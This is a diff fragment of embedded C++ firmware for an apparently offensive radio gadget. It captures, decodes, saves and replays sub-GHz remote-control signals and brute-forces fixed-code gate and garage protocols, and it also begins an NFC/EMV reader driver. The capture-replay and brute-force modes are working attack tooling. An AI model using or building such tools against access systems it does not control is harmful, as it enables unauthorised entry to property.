+            if (kp('.')) { cc_sel = (cc_sel + 1) % cc_item_count; cc_need_draw = true; delay(150); }
+            if (kp(KEY_ENTER)) { mode = cc_sel + 1; keyRelease(); }
+            delay(10);
+        }
+
+        uint32_t freq_hz = cc_frequencies[cc_freq_idx] * 1000;
+        cc_set_frequency(freq_hz / 1000000.0f);
+        cc_apply_preset(cc_preset_idx);
+
+        // ── Mode 1: Read (decode protocols) ──
+        if (mode == 1) {
+            cc_set_raw_rx();
+            cc_decoders_reset();
+            cc_isr_start(); // GPIO interrupt captures edges in background
+            SubGhzDecoded last_decoded = {};
+            bool has_decoded = false;
+            unsigned long last_draw = 0;
+            unsigned long edge_count = 0;
+            unsigned long feed_count = 0;
+
+            while (true) {
+                // Drain ISR edge buffer — process all captured edges
+                bool level; int32_t dur;
+                while (cc_isr_read(&level, &dur)) {
+                    edge_count++;
+                    feed_count++;
+                    SubGhzDecoded d = {};
+                    if (cc_decoders_feed(level, dur, d)) {
+                        last_decoded = d;
+                        last_decoded.te = d.te;
+                        has_decoded = true;
+                    }
+                }
+
+                // Check keys + draw UI — ISR keeps capturing edges in background
+                unsigned long now = millis();
+                {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); cc_isr_stop(); break; }
+                    if (kp('+') || kp('=')) {
+                        keyRelease(); cc_isr_stop();
+                        cc_freq_idx = min(cc_freq_idx+1, 17);
+                        freq_hz = cc_frequencies[cc_freq_idx]*1000;
+                        cc_set_frequency(freq_hz/1000000.0f);
+                        cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
+                    }
+                    if (kp('-') || kp('_')) {
+                        keyRelease();
+                        cc_freq_idx = max(cc_freq_idx-1, 0);
+                        freq_hz = cc_frequencies[cc_freq_idx]*1000;
+                        cc_set_frequency(freq_hz/1000000.0f);
+                        cc_isr_stop(); cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
+                    }
+                    if (kp(KEY_TAB)) {
+                        keyRelease();
+                        cc_preset_idx = (cc_preset_idx + 1) % 4;
+                        cc_apply_preset(cc_preset_idx);
+                        cc_isr_stop(); cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
+                    }
+                }
+
+                if (now - last_draw < 200) continue;
+                last_draw = now;
+
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.drawFastHLine(0, 14, W, 0xFC00);
+                sp.setTextSize(1); sp.setTextFont(1);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                sp.printf("Read %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz/1000000.0f);
+                float rssi = cc_get_rssi();
+                sp.setCursor(W-55, 3); sp.printf("%.0fdBm", rssi);
+
+                if (has_decoded) {
+                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                    sp.setCursor(10, 22); sp.printf("Protocol: %s", last_decoded.protocol);
+                    int nb = max(3, (last_decoded.bit_count+7)/8);
+                    uint64_t mask = last_decoded.data & ((last_decoded.bit_count < 64)
+                        ? ((1ULL << last_decoded.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
+                    uint64_t yek = 0;
+                    for (int _b = 0; _b < last_decoded.bit_count; _b++)
+                        yek |= ((mask >> _b) & 1ULL) << (last_decoded.bit_count - 1 - _b);
+                    sp.setCursor(10, 35); sp.printf("Key:0x%0*llX", nb*2, mask);
+                    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(10, 47); sp.printf("Yek:0x%0*llX", nb*2, yek);
+                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                    sp.setCursor(10, 59); sp.printf("Bits: %d  Te: %dus", last_decoded.bit_count, last_decoded.te);
+                    int info_y = 71;
+                    if (last_decoded.serial) {
+                        sp.setCursor(10, info_y);
+                        sp.printf("Sn:0x%05X Btn:%X", last_decoded.serial, last_decoded.btn);
+                        info_y += 12;
+                    } else if (last_decoded.btn && !last_decoded.serial) {
+                        sp.setCursor(10, info_y); sp.printf("Btn:%X", last_decoded.btn);
+                        info_y += 12;
+                    }
+                    // DIP display for Ansonic, Doitrand, Linear
+                    bool has_dip = last_decoded.cnt && (
+                        strcmp(last_decoded.protocol, "Ansonic") == 0 ||
+                        strcmp(last_decoded.protocol, "Doitrand") == 0);
+                    if (has_dip) {
+                        uint16_t d = last_decoded.cnt;
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        sp.setCursor(10, info_y);
+                        sp.printf("DIP:%c%c%c%c%c%c%c%c%c%c",
+                            d&0x800?'1':'0', d&0x400?'1':'0', d&0x200?'1':'0',
+                            d&0x100?'1':'0', d&0x080?'1':'0', d&0x040?'1':'0',
+                            d&0x020?'1':'0', d&0x010?'1':'0', d&0x001?'1':'0',
+                            d&0x008?'1':'0');
+                        info_y += 12;
+                    } else if (strcmp(last_decoded.protocol, "Linear") == 0 && last_decoded.cnt) {
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        sp.setCursor(10, info_y);
+                        uint16_t d = last_decoded.cnt;
+                        sp.printf("DIP:%c%c%c%c%c%c%c%c%c%c",
+                            d&0x200?'1':'0', d&0x100?'1':'0', d&0x080?'1':'0',
+                            d&0x040?'1':'0', d&0x020?'1':'0', d&0x010?'1':'0',
+                            d&0x008?'1':'0', d&0x004?'1':'0', d&0x002?'1':'0',
+                            d&0x001?'1':'0');
+                        info_y += 12;
+                    }
+                    if (last_decoded.is_rolling) {
+                        sp.setTextColor(TFT_RED, TFT_BLACK);
+                        sp.setCursor(10, info_y); sp.print("Rolling code");
+                        info_y += 12;
+                    }
+                    if (last_decoded.cnt && !has_dip && strcmp(last_decoded.protocol, "Linear") != 0) {
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        sp.setCursor(10, info_y); sp.printf("Cnt: %d", last_decoded.cnt);
+                    }
+                } else {
+                    sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                    sp.setCursor(30, 55); sp.print("Waiting for signal...");
+                }
+
+                sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                sp.setCursor(2, 108); sp.printf("Edges:%lu Feed:%lu", edge_count, feed_count);
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                sp.print("+/-=freq S=send ENT=save");
+                if (use_sprite) sprite->pushSprite(0, 0);
+
+                // Send on S — encode and transmit directly
+                if (has_decoded && (kp('s') || kp('S'))) {
+                    keyRelease();
+                    int32_t enc_pulses[256];
+                    int enc_count = cc_encode_signal(last_decoded, enc_pulses, 256);
+                    if (enc_count > 0) {
+                        sp.fillRect(10, 95, 220, 20, TFT_BLACK);
+                        sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                        sp.setCursor(10, 95); sp.printf("Sending %s...", last_decoded.protocol);
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        cc_isr_stop(); cc_send_raw(enc_pulses, enc_count, 1);
+                        sp.setCursor(160, 95); sp.print("Done!");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        delay(500);
+                    }
+                    cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
+                }
+
+                // Save on ENTER — encode as RAW .sub so Saved can replay it
+                if (has_decoded && kp(KEY_ENTER)) {
+                    keyRelease();
+                    SD.mkdir("/evil/subghz");
+                    char fname[64];
+                    snprintf(fname, sizeof(fname), "/evil/subghz/%s_%lu.sub",
+                             last_decoded.protocol, millis());
+                    int32_t enc_pulses[256];
+                    int enc_count = cc_encode_signal(last_decoded, enc_pulses, 256);
+                    Serial.printf("[ENC] %s %d bits → %d pulses:", last_decoded.protocol, last_decoded.bit_count, enc_count);
+                    for (int _e = 0; _e < min(20, enc_count); _e++) Serial.printf(" %d", enc_pulses[_e]);
+                    Serial.println();
+                    if (enc_count > 0) {
+                        cc_save_sub(fname, freq_hz, cc_presets[cc_preset_idx].sub_name, enc_pulses, enc_count);
+                    } else {
+                        cc_save_sub_key(fname, freq_hz, last_decoded);
+                    }
+                    sp.fillRect(10, 100, 220, 12, TFT_BLACK);
+                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                    sp.setCursor(10, 100); sp.print("Saved!");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+                    delay(500);
+                }
+            }
+
+        // ── Mode 2: Read RAW (Flipper-style, SD streaming, infinite capture) ──
+        }
+        if (mode == 2) {
+            cc_set_raw_rx();
+            SD.mkdir("/evil/subghz");
+            char fname[64];
+            snprintf(fname, sizeof(fname), "/evil/subghz/raw_%lu.sub", millis());
+            File raw_file = SD.open(fname, FILE_WRITE);
+            bool has_sd = (raw_file);
+            if (has_sd) {
+                uint32_t fhz = (uint32_t)(cc_freq_mhz * 1000000.0f);
+                raw_file.println("Filetype: Flipper SubGhz RAW File");
+                raw_file.println("Version: 1");
+                raw_file.printf("Frequency: %lu\n", fhz);
+                raw_file.printf("Preset: FuriHalSubGhzPreset%s\n", cc_presets[cc_preset_idx].sub_name);
+                raw_file.println("Protocol: RAW");
+            }
+
+            bool last_level = digitalRead(CC_GDO0);
+            unsigned long last_edge = micros();
+            unsigned long last_draw = 0;
+            unsigned long rec_start = millis();
+            unsigned long last_activity = millis();
+            bool recording = true;
+            unsigned long total_pulses = 0;
+
+            // Capture buffer (flushed to SD periodically)
+            #define RAW_BUF 256
+            int32_t raw_buf[RAW_BUF];
+            int buf_pos = 0;
+
+            // Also keep last 2048 in RAM for replay without SD
+            cc_raw_count = 0;
+
+            // Waveform display ring buffer
+            int16_t wf_dur[240];
+            uint8_t wf_lvl[240];
+            int wf_pos = 0, wf_total = 0;
+
+            while (recording) {
+                // Tight edge capture loop (no M5.update for timing accuracy)
+                for (int _i = 0; _i < 5000; _i++) {
+                    bool cur = digitalRead(CC_GDO0);
+                    if (cur != last_level) {
+                        unsigned long now_us = micros();
+                        int32_t dur = (int32_t)(now_us - last_edge);
+                        if (dur > 50 && dur < 200000) {
+                            int32_t pulse = last_level ? dur : -dur;
+                            // SD streaming buffer
+                            raw_buf[buf_pos++] = pulse;
+                            total_pulses++;
+                            // RAM replay buffer (circular — keeps last 2048)
+                            cc_raw_pulses[cc_raw_count % CC_MAX_PULSES] = pulse;
+                            cc_raw_count++;
+                            last_activity = millis();
+                            // Waveform display
+                            wf_lvl[wf_pos] = last_level ? 1 : 0;
+                            wf_dur[wf_pos] = (int16_t)min((int32_t)3000, dur / 10);
+                            wf_pos = (wf_pos + 1) % 240;
+                            wf_total++;
+                        }
+                        last_edge = now_us;
+                        last_level = cur;
+                    }
+                }
+
+                // Flush buffer to SD when full
+                if (buf_pos >= RAW_BUF && has_sd) {
+                    raw_file.print("RAW_Data:");
+                    for (int i = 0; i < buf_pos; i++) raw_file.printf(" %d", raw_buf[i]);
+                    raw_file.println();
+                    buf_pos = 0;
+                }
+
+                // UI update every 150ms
+                unsigned long now = millis();
+                if (now - last_draw < 150) continue;
+                last_draw = now;
+
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); recording = false; }
+
+                float elapsed = (now - rec_start) / 1000.0f;
+
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                sp.printf("REC RAW %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz/1000000.0f);
+                if ((now / 500) % 2 == 0)
+                    sp.fillCircle(W - 10, 7, 4, TFT_RED);
+
+                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                sp.setCursor(4, 18);
+                sp.printf("Pulses: %lu", total_pulses);
+                sp.setCursor(140, 18);
+                bool active = (now - last_activity < 200);
+                sp.setTextColor(active ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                sp.print(active ? "SIGNAL" : "idle");
+                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                sp.setCursor(4, 30);
+                sp.printf("Time: %.1fs  %s", elapsed, has_sd ? "SD OK" : "NO SD");
+
+                // Waveform
+                int wf_y = 46, wf_h = 70, wf_mid = wf_y + wf_h / 2;
+                sp.drawFastHLine(0, wf_mid, W, 0x2104);
+                if (wf_total > 0) {
+                    int drawn = min(wf_total, 240);
+                    int start = (wf_total >= 240) ? wf_pos : 0;
+                    int x = W - 1;
+                    for (int i = drawn - 1; i >= 0 && x >= 0; i--) {
+                        int idx = (start + i) % 240;
+                        int bar_w = max(1, min(4, wf_dur[idx] / 30));
+                        bool high = (wf_lvl[idx] == 1);
+                        int y1 = high ? (wf_mid - wf_h/3) : (wf_mid + 2);
+                        uint16_t c = high ? TFT_GREEN : 0x03E0;
+                        sp.fillRect(max(0, x - bar_w + 1), y1, wf_h/3, bar_w > 1 ? bar_w : 1, c);
+                        x -= bar_w;
+                    }
+                }
+
+                sp.fillRect(0, H - 14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                sp.print("BACK=stop");
+                if (use_sprite) sprite->pushSprite(0, 0);
+            }
+
+            // Flush remaining to SD
+            if (buf_pos > 0 && has_sd) {
+                raw_file.print("RAW_Data:");
+                for (int i = 0; i < buf_pos; i++) raw_file.printf(" %d", raw_buf[i]);
+                raw_file.println();
+            }
+            if (has_sd) raw_file.close();
+
+            // Fix cc_raw_count for replay (use last CC_MAX_PULSES)
+            if (cc_raw_count > CC_MAX_PULSES) {
+                int start = cc_raw_count % CC_MAX_PULSES;
+                if (start != 0) {
+                    int32_t* tmp = (int32_t*)malloc(CC_MAX_PULSES * sizeof(int32_t));
+                    if (tmp) {
+                        for (int i = 0; i < CC_MAX_PULSES; i++)
+                            tmp[i] = cc_raw_pulses[(start + i) % CC_MAX_PULSES];
+                        memcpy(cc_raw_pulses, tmp, CC_MAX_PULSES * sizeof(int32_t));
+                        free(tmp);
+                    }
+                }
+                cc_raw_count = CC_MAX_PULSES;
+            }
+
+            Serial.printf("[RAW] %lu total, %d in RAM. First 30:\n", total_pulses, cc_raw_count);
+            for (int i = 0; i < min(30, cc_raw_count); i++)
+                Serial.printf(" %d", cc_raw_pulses[i]);
+            Serial.println();
+
+            // Result screen
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 14, 0x0841);
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+            sp.print("Capture Complete");
+            sp.setTextColor(TFT_GREEN, TFT_BLACK);
+            sp.setCursor(10, 22); sp.printf("Total: %lu pulses", total_pulses);
+            sp.setCursor(10, 36); sp.printf("RAM: %d (for replay)", cc_raw_count);
+            if (has_sd) {
+                sp.setCursor(10, 50); sp.printf("SD: %s", fname + 13);
+            } else {
+                sp.setCursor(10, 50); sp.print("No SD card");
+            }
+            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+            sp.setCursor(10, 72); sp.print("ENTER=Send  BACK=menu");
+            if (use_sprite) sprite->pushSprite(0, 0);
+
+            while (true) {
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                if (kp(KEY_ENTER) && cc_raw_count > 0) {
+                    keyRelease();
+                    sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                    // Reload from SD for full file replay (not limited to RAM buffer)
+                    uint32_t rfhz; int rcnt;
+                    int32_t* rdata = has_sd ? cc_load_sub_malloc(fname, &rfhz, &rcnt) : nullptr;
+                    if (rdata && rcnt > 0) {
+                        sp.setCursor(10, 90); sp.printf("Sending %d pulses (SD)...", rcnt);
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        cc_send_raw(rdata, rcnt, 1);
+                        free(rdata);
+                    } else {
+                        sp.setCursor(10, 90); sp.printf("Sending %d pulses (RAM)...", cc_raw_count);
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        cc_send_raw(cc_raw_pulses, min(cc_raw_count, CC_MAX_PULSES), 1);
+                    }
+                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                    sp.setCursor(10, 104); sp.print("Done!");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+                    delay(1000);
+                }
+                delay(10);
+            }
+
+        // ── Mode 3: Saved (.sub files) ──
+        }
+        if (mode == 3) {
+            File dir = SD.open("/evil/subghz");
+            String files[20]; int file_count = 0;
+            if (dir) {
+                while (File entry = dir.openNextFile()) {
+                    if (!entry.isDirectory() && String(entry.name()).endsWith(".sub") && file_count < 20)
+                        files[file_count++] = String("/evil/subghz/") + entry.name();
+                    entry.close();
+                }
+                dir.close();
+            }
+            if (file_count == 0) {
+                sp.fillScreen(TFT_BLACK);
+                sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 55); sp.print("No .sub files found");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2000);
+            } else {
+                int sel = 0, scroll = 0;
+                while (true) {
+                    int visible = min(file_count - scroll, 7);
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                    sp.printf("Saved (%d files)", file_count);
+                    for (int i = 0; i < visible; i++) {
+                        int idx = scroll + i;
+                        bool s = (idx == sel);
+                        sp.setTextColor(s ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                        sp.setCursor(4, 18 + i * 14);
+                        String fn = files[idx].substring(files[idx].lastIndexOf('/') + 1);
+                        if (fn.length() > 30) fn = fn.substring(0, 30);
+                        sp.print(s ? "> " : "  "); sp.print(fn);
+                    }
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.print(";=up .=dn ENT=send D=del");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); goto mode3_done; }
+                        if (kp('.')) {
+                            keyRelease(); sel = (sel + 1) % file_count;
+                            if (sel >= scroll + 7) scroll = sel - 6;
+                            if (sel < scroll) scroll = sel;
+                            break;
+                        }
+                        if (kp(';')) {
+                            keyRelease(); sel = (sel - 1 + file_count) % file_count;
+                            if (sel < scroll) scroll = sel;
+                            if (sel >= scroll + 7) scroll = sel - 6;
+                            break;
+                        }
+                        if (kp(KEY_ENTER)) {
+                            keyRelease();
+                            uint32_t fhz; int cnt;
+                            int32_t* sub_data = cc_load_sub_malloc(files[sel].c_str(), &fhz, &cnt);
+                            if (sub_data && cnt > 0) {
+                                cc_set_frequency(fhz / 1000000.0f);
+                                sp.fillScreen(TFT_BLACK);
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                sp.setCursor(10, 50); sp.printf("Sending %d pulses...", cnt);
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                cc_send_raw(sub_data, cnt, 1);
+                                sp.setCursor(10, 70); sp.print("Done!");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                delay(1000);
+                                free(sub_data);
+                            } else {
+                                sp.fillScreen(TFT_BLACK);
+                                sp.setTextColor(TFT_RED, TFT_BLACK);
+                                sp.setCursor(10, 50); sp.print("Failed to load file");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                delay(1000);
+                            }
+                            break;
+                        }
+                        if (kp(KEY_DELETE) || kp('d') || kp('D')) {
+                            keyRelease();
+                            // Confirmation popup
+                            String fn_del = files[sel].substring(files[sel].lastIndexOf('/') + 1);
+                            sp.fillScreen(TFT_BLACK);
+                            sp.setTextColor(TFT_RED, TFT_BLACK);
+                            sp.setCursor(10, 40); sp.print("Delete this file?");
+                            sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            sp.setCursor(10, 60); sp.print(fn_del);
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                            sp.setCursor(10, 90); sp.print("ENTER=Yes  BACK=No");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            bool confirmed = false;
+                            while (true) {
+                                M5.update(); cardUpdate();
+                                if (kp(KEY_ENTER)) { keyRelease(); confirmed = true; break; }
+                                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                                delay(10);
+                            }
+                            if (confirmed) {
+                                SD.remove(files[sel].c_str());
+                                for (int i = sel; i < file_count-1; i++) files[i] = files[i+1];
+                                file_count--;
+                                if (file_count == 0) goto mode3_done;
+                                if (sel >= file_count) sel = file_count - 1;
+                            }
+                            break;
+                        }
+                        delay(10);
+                    }
+                }
+                mode3_done:;
+            }
+
+        // ── Mode 4: Frequency Analyzer ──
+        }
+        if (mode == 4) {
+            uint32_t scan_f[] = {300000, 315000, 390000, 433920, 868350, 868950, 915000};
+            const int NS = 7;
+            float pk[7]; for (int i = 0; i < NS; i++) pk[i] = -130;
+            cc_apply_preset(0);
+
+            while (true) {
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                if (kp('r') || kp('R')) { for (int i = 0; i < NS; i++) pk[i] = -130; }
+
+                float rs[7]; float best = -130; int bi = 3;
+                for (int i = 0; i < NS; i++) {
+                    cc_set_frequency(scan_f[i] / 1000.0f);
+                    cc_start_rx(); delay(20);
+                    rs[i] = cc_get_rssi();
+                    if (rs[i] > best) { best = rs[i]; bi = i; }
+                    if (rs[i] > pk[i]) pk[i] = rs[i];
+                }
+
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.drawFastHLine(0, 14, W, 0xFC00);
+                sp.setTextSize(1); sp.setTextFont(1);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 3); sp.print("Freq Analyzer");
+                sp.setTextColor(0xFC00, TFT_BLACK);
+                sp.setCursor(60, 20); sp.printf("%.3f MHz", scan_f[bi] / 1000.0f);
+                sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                sp.setCursor(60, 32); sp.printf("RSSI: %.0f dBm", best);
+
+                int by = 48, bh = 55, bw = (W - 20) / NS - 2;
+                for (int i = 0; i < NS; i++) {
+                    int x = 10 + i * (bw + 2);
+                    float nm = max(0.0f, min(1.0f, (rs[i] + 120) / 70.0f));
+                    int h = (int)(nm * bh);
+                    uint16_t c = (i == bi) ? TFT_GREEN : 0x2104;
+                    if (h > 2) sp.fillRect(x, by + bh - h, bw, h, c);
+                    float pn = max(0.0f, min(1.0f, (pk[i] + 120) / 70.0f));
+                    int py = by + bh - (int)(pn * bh);
+                    if (pk[i] > -120) sp.drawFastHLine(x, py, bw, TFT_RED);
+                    sp.setTextColor(0x5AEB, TFT_BLACK);
+                    sp.setCursor(x, by + bh + 3); sp.printf("%d", (int)(scan_f[i] / 1000));
+                }
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                sp.print("R=Reset BACK=exit");
+                if (use_sprite) sprite->pushSprite(0, 0);
+            }
+            // Restore frequency
+            cc_set_frequency(cc_frequencies[cc_freq_idx] * 1000 / 1000000.0f);
+
+        // ── Mode 5: Spectrum Analyzer ──
+        }
+        if (mode == 5) {
+            cc_spectrum_analyzer(sp, use_sprite, sprite);
+
+        // ── Mode 6: Waterfall SDR ──
+        } else if (mode == 6) {
+            cc_waterfall(sp, use_sprite, sprite);
+
+        // ── Mode 7: Brute Force ──
+        } else if (mode == 7) {
+            // Build list of brute-forceable protocols (not rolling, ≤16 bits)
+            struct BfProto { const char* name; int bits; int style; int te; };
+            BfProto bf_list[20]; int bf_count = 0;
+            for (int i = 0; i < (int)CC_NUM_TABLE_PROTOS && bf_count < 20; i++) {
+                if (!cc_proto_table[i].is_rolling && cc_proto_table[i].min_bits <= 16)
+                    bf_list[bf_count++] = {cc_proto_table[i].name, cc_proto_table[i].min_bits,
+                                           cc_proto_table[i].style, (int)cc_proto_table[i].te_short};
+            }
+            // Add custom decoders (BETT 18-bit)
+            bf_list[bf_count++] = {"BETT", 18, STYLE_CAME, 340};
+
+            int sel = 0;
+            while (true) {
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Brute Force");
+                int visible = min(bf_count, 8);
+                int scroll = max(0, sel - 7);
+                for (int i = 0; i < visible; i++) {
+                    int idx = scroll + i;
+                    if (idx >= bf_count) break;
+                    sp.setTextColor(idx == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(4, 18 + i * 13);
+                    int codes = 1 << bf_list[idx].bits;
+                    sp.printf("%s %s %d-bit (%d)", idx == sel ? ">" : " ",
+                              bf_list[idx].name, bf_list[idx].bits, codes);
+                }
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                sp.printf(";=up .=dn ENT=start  %.3fMHz", freq_hz/1000000.0f);
+                if (use_sprite) sprite->pushSprite(0, 0);
+
+                bool selected = false;
+                while (true) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); goto bf_done; }
+                    if (kp('.')) { keyRelease(); sel = (sel + 1) % bf_count; break; }
+                    if (kp(';')) { keyRelease(); sel = (sel - 1 + bf_count) % bf_count; break; }
+                    if (kp(KEY_ENTER)) { keyRelease(); selected = true; break; }
+                    delay(10);
+                }
+                if (!selected) continue;
+
+                // Launch brute force for selected protocol
+                SubGhzDecoded sig = {};
+                sig.protocol = bf_list[sel].name;
+                sig.bit_count = bf_list[sel].bits;
+                sig.te = bf_list[sel].te;
+                sig.data = 0;
+                sig.is_rolling = false;
+                cc_brute_force(sig, sp, use_sprite, sprite);
+                cc_set_raw_rx();
+            }
+            bf_done:;
+        }
+
+    } // end while(true) sub-menu loop
+
+    sub_exit:
+    if (sprite) { sprite->deleteSprite(); delete sprite; }
+    cc_close();
+    digitalWrite(CC_CS, HIGH);
+    free(cc_raw_buf); cc_raw_buf = nullptr;
+    free(cc_raw_pulses); cc_raw_pulses = nullptr;
+    M5.Display.clear(menuBackgroundColor);
+    inMenu = true;
+}
+
+
+// =====================================================================
+// ========================= Cap NFC =============================
+// =====================================================================
+// NFC reader/writer/EMV via ST25R3916 on M5Stack Cap HAT
+// Ported from Raspyjack Python (_st25r_driver.py, _emv_reader.py)
+// =====================================================================
+
+// NFC Cap HAT pins (shares SPI bus with CC1101)
+#define NFC_CS    6
+#define NFC_IRQ   4
+
+// ST25R3916 registers
+#define NFC_IO_CFG1     0x00
+#define NFC_IO_CFG2     0x01
+#define NFC_OP_CTRL     0x02
+#define NFC_MODE_DEF    0x03
+#define NFC_BIT_RATE    0x04
+#define NFC_ISO14443A   0x05
+#define NFC_AUX_DEF     0x0A
+#define NFC_RX_CONF1    0x0B
+#define NFC_NRT1        0x10
+#define NFC_TIMER_EMV   0x12
+#define NFC_MASK_IRQ    0x16
+#define NFC_IRQ_MAIN    0x1A
+#define NFC_IRQ_ERR     0x1C
+#define NFC_IRQ_TGT     0x1D
+#define NFC_FIFO_STA1   0x1E
+#define NFC_TX_BYTES1   0x22
+#define NFC_ANT_TUNE1   0x26
+#define NFC_ANT_TUNE2   0x27
+#define NFC_TX_DRIVER   0x28
+#define NFC_PT_MOD      0x29
+#define NFC_EFD_ON      0x2A
+#define NFC_EFD_OFF     0x2B
+#define NFC_AUX_DISP    0x31
+#define NFC_IC_ID       0x3F
+
+// SPI opcodes
+#define NFC_OP_READ   0x40
+#define NFC_OP_FIFO_W 0x80
+#define NFC_OP_FIFO_R 0x9F
+
+// Commands
+#define NFC_CMD_SET_DEFAULT 0xC1
+#define NFC_CMD_STOP_ALL    0xC2
+#define NFC_CMD_TX_CRC      0xC4
+#define NFC_CMD_TX_NO_CRC   0xC5
+#define NFC_CMD_TX_WUPA     0xC7
+#define NFC_CMD_FIELD_ON    0xC8
+#define NFC_CMD_RESET_GAIN  0xD5
+#define NFC_CMD_ADJUST_REG  0xD6
+#define NFC_CMD_CLEAR_FIFO  0xDB
+#define NFC_CMD_UNMASK_RX   0xD1
+#define NFC_CMD_GOTO_SENSE  0xCD
+#define NFC_CMD_GOTO_SLEEP  0xCE
+#define NFC_CMD_MEAS_PWR    0xDF
+#define NFC_CMD_SPACE_B     0xFB
+#define NFC_CMD_TEST        0xFC
+#define NFC_PT_A_LOAD       0xA0
+#define NFC_PASS_TGT        0x08
+#define NFC_MASK_RX_TMR     0x13
+
+static bool nfc_opened = false;
+
+// NFC SPI uses same bus as CC1101/SD but SPI_MODE1 and different CS
+void nfc_select() {
+    digitalWrite(CC_CS, HIGH);
+    cc_spi->beginTransaction(SPISettings(5000000, MSBFIRST, SPI_MODE1));
+    digitalWrite(NFC_CS, LOW);
+}
+void nfc_deselect() {
+    digitalWrite(NFC_CS, HIGH);
+    cc_spi->endTransaction();
+}
+
+void nfc_xfer(const uint8_t* tx, uint8_t* rx, int len) {
+    nfc_select();
+    for (int i = 0; i < len; i++) rx[i] = cc_spi->transfer(tx[i]);
+    nfc_deselect();
+}
+
+void nfc_cmd(uint8_t c) {
+    nfc_select();
+    cc_spi->transfer(c);
+    nfc_deselect();
+}
+
+uint8_t nfc_rr(uint8_t reg) {
+    uint8_t tx[2] = {(uint8_t)(NFC_OP_READ | (reg & 0x3F)), 0x00};
+    uint8_t rx[2];
+    nfc_xfer(tx, rx, 2);
+    return rx[1];
+}
+
+void nfc_wr(uint8_t reg, uint8_t val) {
+    uint8_t tx[2] = {(uint8_t)(reg & 0x3F), val};
+    uint8_t rx[2];
+    nfc_xfer(tx, rx, 2);
+}
+
+void nfc_fifo_w(const uint8_t* data, int len) {
+    nfc_select();
+    cc_spi->transfer(NFC_OP_FIFO_W);
+    for (int i = 0; i < len; i++) cc_spi->transfer(data[i]);
+    nfc_deselect();
